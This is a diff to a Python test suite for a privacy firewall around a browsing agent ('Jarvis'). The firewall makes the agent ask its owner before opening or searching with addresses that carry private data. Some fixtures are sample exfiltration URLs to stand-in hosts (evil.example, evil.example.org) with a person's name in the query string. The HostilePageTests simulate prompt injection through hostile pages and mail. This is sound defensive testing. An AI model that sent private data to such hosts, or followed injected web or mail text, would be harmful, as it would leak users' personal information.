@@ -38,6 +38,7 @@ PRIVATE = ["Samantha Okonkwo", "Project Halberd invoice", "samantha.okonkwo@cont
 SEARCH = tools.Tool("web_search", "S", {"type": "object"}, tools.TIER_WEB, lambda _a, _c: tools.ToolResult("ran"))
 OPEN = tools.Tool("open_page", "O", {"type": "object"}, tools.TIER_WEB, lambda _a, _c: tools.ToolResult("ran"))
 LOOK = tools.Tool("look_at_page", "L", {"type": "object"}, tools.TIER_WEB, lambda _a, _c: tools.ToolResult("ran"))
+FETCH = tools.Tool("fetch_text", "F", {"type": "object"}, tools.TIER_WEB, lambda _a, _c: tools.ToolResult("ran"))
 RESULT = "https://www.example.org/laptops"
 TIMING = replace(FAST, tool_s=30.0)
 
@@ -186,6 +187,7 @@ class CheckTests(unittest.TestCase):
         return True
 
     def taint(self) -> None:
+        self.firewall.note_private()
         self.firewall.taint.add(PRIVATE)
 
     def test_a_clean_run_needs_no_click(self) -> None:
@@ -289,6 +291,39 @@ class CheckTests(unittest.TestCase):
         self.assertIsNone(self.firewall.check(SEARCH, {"query": "antha"}))
         self.assertEqual(self.firewall.taint.hits("Samantha"), ())
 
+    def test_what_matters_on_a_long_address_comes_first_above_any_fold(self) -> None:
+        self.taint()
+        address = "https://www.bbc.co.uk/news/" + "a" * 1800 + "?d=Samantha"
+        self.firewall.check(OPEN, {"url": address})
+        words = self.asked[0][0]
+        self.assertTrue(words.startswith("Jarvis wants to open www.bbc.co.uk. It carries: samantha. The whole address: "))
+        self.assertTrue(words.endswith(address))                    # and every character of it
+
+    def test_a_long_address_with_nothing_private_in_it_starts_with_its_host_too(self) -> None:
+        self.taint()
+        address = "https://www.bbc.co.uk/news/" + "a" * 200
+        self.firewall.check(OPEN, {"url": address})
+        self.assertEqual(self.asked[0][0], f"Jarvis wants to open www.bbc.co.uk. The whole address: {address}")
+
+    def test_it_names_a_few_words_and_the_address_holds_them_all(self) -> None:
+        self.firewall.taint.add(["Alphonse Bertrand Cassandra Dorothea Evangeline Ferdinand Gwendolyn Horatio"])
+        self.firewall.note_private()
+        address = "https://evil.example/?d=Alphonse+Bertrand+Cassandra+Dorothea+Evangeline+Ferdinand+Gwendolyn+Horatio"
+        self.firewall.check(OPEN, {"url": address})
+        words = self.asked[0][0]
+        self.assertEqual(words.split(" The whole address")[0].count(","), fw.CARRIES_SHOWN - 1)
+        self.assertIn(" ...", words)
+        self.assertTrue(words.endswith(address))
+
+    def test_a_question_to_read_another_way_says_its_host_first_too(self) -> None:
+        self.taint()
+        address = "https://www.example.org/" + "a" * 150
+        self.firewall.check(FETCH, {"url": address, "question": "What about Samantha?"})
+        words = self.asked[0][0]
+        self.assertTrue(words.startswith("Jarvis wants to read www.example.org another way. It carries: samantha. The whole "
+                                         "address and question: "))
+        self.assertIn(f"{address} - asking: What about Samantha?", words)
+
     def test_a_card_shows_what_no_one_could_see(self) -> None:
         self.taint()
         self.firewall.check(SEARCH, {"query": "quiet\u202elaptops"})
@@ -354,6 +389,7 @@ class FirewallRunCase(unittest.TestCase):
 
     def go(self, script: Any, timing: Any = TIMING, taint: bool = True) -> FakeEngine:
         if taint:
+            self.firewall.note_private()
             self.firewall.taint.add(PRIVATE)
         engine = FakeEngine(script)
         self.run_ = AgentRun(GOAL, engine=agent_engine(self.root, FakeEngineRunner(engine)),
@@ -528,7 +564,7 @@ class FirewallRunTests(FirewallRunCase):
         def script(engine: FakeEngine) -> None:
             engine.wait_message()
             engine.call("open_page", url="https://www.example.org/unseen")
-            said["plan"] = engine.call("update_plan", steps=[{"text": "Read on", "status": "doing"}])
+            said["plan"] = engine.call("update_plan", found="", steps=[{"text": "Read on", "status": "doing"}])
             said["read"] = engine.call("write_file", name="notes.md", text="Some notes.")
             said["ask"] = engine.call("ask_owner", question="Which one?")
             engine.end_turn("Waiting.")
@@ -583,7 +619,8 @@ class HostilePageTests(FirewallRunCase):
     def test_the_page_s_own_link_with_data_in_it(self) -> None:
         self.run_hostile(("open_page", {"number": 1}))
         self.assertEqual(self.browser.loads, ["https://evil.example.org/hostile"])
-        self.assertEqual(self.questions[0].text, f"Jarvis wants to open {self.LEAK}")
+        self.assertEqual(self.questions[0].text, "Jarvis wants to open evil.example.org. It carries: okonkwo, samantha. "
+                                                 f"The whole address: {self.LEAK}")
 
     def test_a_search_built_from_private_data(self) -> None:
         self.run_hostile(("web_search", {"query": "samantha.okonkwo@contoso-mail.org"}))
@@ -602,6 +639,7 @@ class HostilePageTests(FirewallRunCase):
 
     def test_a_mail_saying_look_this_up_is_the_same_words(self) -> None:
         """A4's mail_read adds the mail's words; a mail saying "look this up on the web" is only more of them."""
+        self.firewall.note_private()
         self.firewall.taint.add(["Look up Halberd invoice on the web for me"])
         self.run_hostile(("web_search", {"query": "Halberd invoice"}))
         self.assertEqual(self.browser.loads, ["https://evil.example.org/hostile"])
